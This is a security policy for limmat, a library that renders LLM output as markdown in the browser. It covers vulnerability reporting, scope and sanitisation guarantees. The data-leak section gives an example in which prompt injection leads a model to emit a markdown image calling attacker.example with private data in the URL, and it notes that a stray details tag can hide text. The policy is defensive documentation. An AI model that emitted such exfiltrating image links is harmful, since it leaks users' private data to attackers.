# Security policy

limmat renders untrusted text (LLM output) into the DOM, so security reports are welcome.

## Reporting

Report a vulnerability privately, not in a public issue:

- Use GitHub's private vulnerability reporting on the repository (Security tab, "Report a vulnerability"), or
- email contact@daanrosendal.com.

Include the markdown input, how it was split into chunks (or "one write"), the browser, and what you expected versus what happened.

## In scope

Any input that makes limmat create an element or attribute outside its documented DOM, run script, load a resource that the `images` option or the URL checks should have refused, navigate to a disallowed URL, throw, or hang the page. Wrong rendering that is still inert text is a normal bug, not a vulnerability.

## What limmat guarantees

- Text always goes through text nodes. Raw HTML in the input is shown as text, with one exception: a fixed list of formatting tags (`b`, `strong`, `i`, `em`, `u`, `s`, `del`, `ins`, `mark`, `small`, `kbd`, `sub`, `sup`, and `br`) written with no attributes becomes an element with no attributes. A tag with any attribute, and every other tag, stays text. Collapsible sections are the one block-level exception: `<details>` or `<details open>` alone on a line, an optional `<summary>text</summary>` line, and `</details>` become a `details` element (with only `open`) and a `summary` element. The `html` option can only narrow these lists, never extend them.
- Links must use an allowed protocol (`https`, `http`, `mailto` by default) or be a site path you approve, and must parse as a URL. Anything else is refused, including `//host`, backslashes, and whitespace, control, zero-width, bidi, and no-break characters, and the label renders as plain text. `javascript:`, `data:`, and `vbscript:` are refused even if you list them in `allowedProtocols`.
- External links get `target="_blank"` and `rel="noopener noreferrer"` unless you pass `externalLinksNewTab: false`, which adds neither.
- Images are on by default, and each `<img>` source passes the same checks as a link, limited to `https`, `http`, and site paths. `javascript:`, `data:`, `blob:`, and `file:` never load. Every image has `referrerpolicy="no-referrer"`, `loading="lazy"`, and no other attribute from the input.
- limmat works under a strict Content-Security-Policy such as `default-src 'none'; script-src 'self'; style-src 'self'`. It never uses inline scripts, `eval`, or a `style` attribute written as a string: table alignment and the Copy fallback use the CSSOM, which `style-src` does not block. A test guards this.
- The code fence language becomes a class name only if it matches `[A-Za-z0-9_+#-]{1,20}`.
- Nesting is capped (about 12 block levels and 30 inline levels), link destinations are limited to 8192 characters, and each paragraph has a work budget proportional to its length for scanning them, so hostile input cannot overflow the stack or make parsing quadratic.
- The `highlight` callback receives the `<code>` element and the raw language string from the fence (not sanitized, unlike the class name), and is trusted code. Pick a highlighter that escapes its input, as `@speed-highlight/core` does.

## What limmat does not guarantee by default

- **Images can leak data.** An image loads as soon as it renders, with no click. If a reply can contain private data and attacker-controlled input at the same time (prompt injection), a hostile model can emit `![](https://attacker.example/?q=<private data>)` and the browser sends the request. limmat cannot tell that from a normal image. To close it, pass `images: ['https://your-cdn.example']` or `images: false` to `createRenderer`, and set a Content-Security-Policy `img-src`. In scope for a report: any way to get an image to load that these options or the URL checks should have stopped. Out of scope: the default allowing an `https` image.

- **Collapsed sections can hide text.** A closed `<details>` hides its content from a reader until they open it, and a stray `<details>` line wraps the rest of a reply in one (with an attacker-chosen summary, if the text is untrusted). The text stays in the DOM and in the accessibility tree, and a section that never closes is opened when the message ends. If hidden text matters for your use case, pass an `html` array without `details`.

limmat does not protect you from your own CSS or from what your `onLinkClick` does.

## Supported versions

The latest minor release.
